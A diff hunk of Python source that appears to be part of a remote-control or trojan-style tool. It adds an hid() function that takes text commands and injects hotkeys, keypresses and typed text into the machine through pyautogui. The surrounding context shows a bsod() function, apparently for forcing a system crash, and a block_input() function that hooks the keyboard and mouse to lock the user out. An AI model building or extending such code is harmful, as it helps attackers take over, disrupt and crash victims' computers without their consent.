@@ -83,6 +83,25 @@ def bsod():
     byref(c_uint())
 )
 
+def hid(command):
+  prefix = command.split(" ")[0]
+  if prefix == "hotkey":
+    pyautogui.hotkey(command.split(" ")[1], command.split(" ")[2])
+    return "Hotkey sent."
+  elif prefix == "write":
+    for word in command.split(" ")[1:]:
+      if word == command.split(" ")[-1]: 
+        pyautogui.write(word)
+      else:
+        pyautogui.write(word)
+        pyautogui.press("space")
+    return "Text sent."
+  elif prefix == "press":
+    pyautogui.press(command.split(" ")[1])
+    return "Keypress sent."
+  else:
+    return "Invalid format."
+
 def block_input():
   kb_listener.start()
   m_listener.start()
